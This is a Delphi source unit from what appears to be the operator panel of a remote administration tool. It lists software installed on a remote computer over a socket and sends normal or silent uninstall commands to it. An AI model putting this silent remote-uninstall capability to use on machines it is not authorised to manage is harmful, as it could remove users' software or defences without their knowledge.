unit UnitInstalledApplications;

interface


uses
  Windows, Messages, SysUtils, StrUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ExtCtrls, ScktComp, StdCtrls, Spin, umSFPack,zlib,ImageHLP,
  UnitFileTransfer,Menus, ImgList, ToolWin, ComCtrls , Jpeg,
  ClipBrd, UnitSharedData, shellapi,CommCtrl, UnitThumbDb;

type
  TInstalledApplications = class(TForm)
    ListView1: TListView;
    StatusBar1: TStatusBar;
    ImageList1: TImageList;
    PopupMenu1: TPopupMenu;
    Refresh1: TMenuItem;
    N1: TMenuItem;
    Normal1: TMenuItem;
    Silent1: TMenuItem;
    Timer1: TTimer;
    procedure ListView1CustomDrawItem(Sender: TCustomListView;
      Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
    procedure ListView1CustomDrawSubItem(Sender: TCustomListView;
      Item: TListItem; SubItem: Integer; State: TCustomDrawState;
      var DefaultDraw: Boolean);
    procedure Normal1Click(Sender: TObject);
    procedure Silent1Click(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure Refresh1Click(Sender: TObject);
    procedure PopupMenu1Popup(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
    MainSocket: TCustomWinSocket;
    NewSocket: TCustomWinSocket;
    SocketData: TSocketData;
    Group,Computer,User: string;
    procedure ParseData(Socket: TCustomWinSocket; Data: string);
    procedure SetUpConnection(Socket: TCustomWinSocket);
  end;

var
  InstalledApplications: TInstalledApplications;

implementation

{$R *.dfm}

procedure SendData(Socket: TCustomWinSocket; Data: string);
begin
  UnitSharedData.SendData(Socket,'InstalledApplications|' + Data);
end;

procedure DisconnectProc(Socket: TCustomWinSocket);
var
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Socket.Data);
  if TInstalledApplications(SocketData.Form).NewSocket = nil then exit;
  TInstalledApplications(SocketData.Form).NewSocket := nil;
  TInstalledApplications(SocketData.Form).Caption := TInstalledApplications(SocketData.Form).Caption + ' - [Offline]';
  TInstalledApplications(SocketData.Form).Timer1.Enabled := True;
end;

procedure TInstalledApplications.SetUpConnection(Socket: TCustomWinSocket);
var
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Socket.Data);
  SocketData.DisconnectProc := @DisconnectProc;
  Timer1.Enabled := False;
  Caption := Copy(Caption,1,Length(Caption) -12);
  Refresh1.Click;
end;


procedure TInstalledApplications.ParseData(Socket: TCustomWinSocket; Data: string);
var
  Command: string;
  Stream: TMemoryStream;
  Li: TListItem;
  Tmp: string;
  p,i: integer;
  Strings: TStringList;
  StringList: TStringList;
  Date,Time,Cap: string;
begin
  Command := Split(Data,'|',1);
  Delete(Data,1,Length(Command)+1);

  if Command = 'List' then begin
    Listview1.Clear;
    Strings := TStringList.Create;
    StringList := TStringList.Create;
    Strings.Text := Data;
    for i := 0 to Strings.Count -1 do begin
      if Split(Strings.Strings[i], '|', 1) = '' then Continue;
      Li := Listview1.Items.Add;
      Li.Caption := Split(Strings.Strings[i], '|', 1);
      Li.SubItems.Add(Split(Strings.Strings[i], '|', 2));
      Li.SubItems.Add(Split(Strings.Strings[i], '|', 3));
      //Li.SubItems.Add(ansireplacestr(split(Strings.Strings[i], '|', 4),'"',''));
      //Li.SubItems.Add(ansireplacestr(split(Strings.Strings[i], '|', 5),'"',''));
      Li.SubItems.Add(split(Strings.Strings[i], '|', 4));
      Li.SubItems.Add(split(Strings.Strings[i], '|', 5));
      Li.ImageIndex := 0;
    end;
    Strings.Free;
    Listview1.Enabled := True;
  end;

end;

procedure TInstalledApplications.ListView1CustomDrawItem(
  Sender: TCustomListView; Item: TListItem; State: TCustomDrawState;
  var DefaultDraw: Boolean);
begin
  Listview1.Canvas.Brush.Color := $F7F7F7;
end;

procedure TInstalledApplications.ListView1CustomDrawSubItem(
  Sender: TCustomListView; Item: TListItem; SubItem: Integer;
  State: TCustomDrawState; var DefaultDraw: Boolean);
begin
  Listview1.Canvas.Brush.Color := clWhite;
end;

procedure TInstalledApplications.Normal1Click(Sender: TObject);
var
  i: integer;
begin
  for i := 0 to Listview1.Items.Count -1 do begin
    if not listview1.Items[i].Selected then continue;
    SendData(NewSocket,'Uninstall|' + Listview1.Items[i].SubItems[2]);
  end;
end;

procedure ParseInstaller(Data: string; var path: string; var param: string);
var
  exe: string;
  p: integer;
begin
  if copy(data,1,1) <> '"' then begin
   path := data;
   param := '';
   exit;
  end;

  Delete(Data,1,1);
  p := pos('"',Data);
  path := copy(Data,1,p-1);
  Delete(data,1,p+1);
  param := data;
end;

procedure TInstalledApplications.Silent1Click(Sender: TObject);
var
  i: integer;
  path,param: string;
begin
  for i := 0 to Listview1.Items.Count -1 do begin
    if not listview1.Items[i].Selected then continue;
    ParseInstaller(Listview1.Items[i].SubItems[3],Path,Param);
    SendData(NewSocket,'Uninstall|' + Path + '|' + Param);
  end;
end;

procedure TInstalledApplications.Timer1Timer(Sender: TObject);
var
  NewSocketData: TSocketData;
  Li: TListItem;
begin
  Li := GetListItem(Group,Computer,User);
  if Li = nil then exit;
  if Li.Data = nil then exit;
  NewSocketData := TSocketData(Li.Data);
  if NewSocketData.MainSocket = nil then exit;
  UnitSharedData.SendData(NewSocketData.MainSocket,'NewConnection|InstalledApplicationsSocket|' + inttostr(Self.Handle));
end;

procedure TInstalledApplications.FormClose(Sender: TObject;
  var Action: TCloseAction);
var
  TmpSocket: TCustomWinSocket;
begin
  Action := caFree;
  try
    TmpSocket := NewSocket;
    NewSocket := nil;
    if TmpSocket <> nil then TmpSocket.Close;
  except
  end;
end;

procedure TInstalledApplications.Refresh1Click(Sender: TObject);
begin
  Listview1.Enabled := False;
  SendData(NewSocket,'List');
end;

procedure TInstalledApplications.PopupMenu1Popup(Sender: TObject);
begin
  Silent1.Enabled := False;
  if listview1.Selected = nil then exit;
  if Listview1.Selected.SubItems[3] <> '' then Silent1.Enabled := True;
end;

end.
